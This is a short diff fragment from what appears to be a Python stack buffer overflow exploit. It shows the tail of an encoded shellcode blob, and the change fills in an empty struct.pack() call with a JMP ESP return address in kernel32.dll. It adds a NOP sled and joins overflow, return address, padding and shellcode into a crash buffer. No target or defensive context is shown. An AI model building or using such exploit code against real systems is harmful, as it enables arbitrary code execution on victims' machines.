@@ -26,4 +26,6 @@ shellcode = (""\xbf\x5c\x2a\x11\xb3\xd9\xe5\xd9\x74\x24\xf4\x5d\x33\xc9"
                  "\x86\xa9\x22\xd6\x7d\xb1\x47\xd3\x3a\x75\xb4\xa9\x53\x10"
                  "\xba\x1e\x53\x31")
                  overflow = "\x41"* 246
-                 ret = struct.pack()
+                 ret = struct.pack('<L', 0x7C874413) #7C874413 JMP ESP kernel32.dll 
+                 padding = "\x90" * 150 
+                 crash = overflow + ret + padding + shellcode
